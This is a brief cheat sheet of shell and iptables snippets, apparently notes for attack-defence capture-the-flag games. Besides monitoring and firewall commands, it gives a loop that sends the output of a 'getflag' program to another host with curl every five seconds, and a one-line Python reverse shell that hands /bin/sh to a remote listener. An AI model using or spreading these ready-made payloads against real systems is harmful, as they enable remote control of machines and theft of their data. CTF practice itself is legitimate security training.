# 服务监控
```
$  watch -n1 "netstat -tn | grep 127.0.0.1:8080"
```

# iptables
```
$ iptables -A INPUT -i eth0 -p tcp -s IP -j DROP
# ban 某个IP
$ iptables -A PREROUTING -t nat -i eth1 -p tcp --dport 80 -j DNAT --to 115.159.191.193:8081
$ iptables -t nat -A POSTROUTING -d 115.159.191.193 -p tcp --dport 8081 -j SNAT --to 115.28.165.90
# 远程NAT流量转发
while [ 1 ];
do
curl 192.168.136.245:8888/`/usr/bin/getflag`;sleep 5;
done
# 死循环
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
# python 反弹shell

```
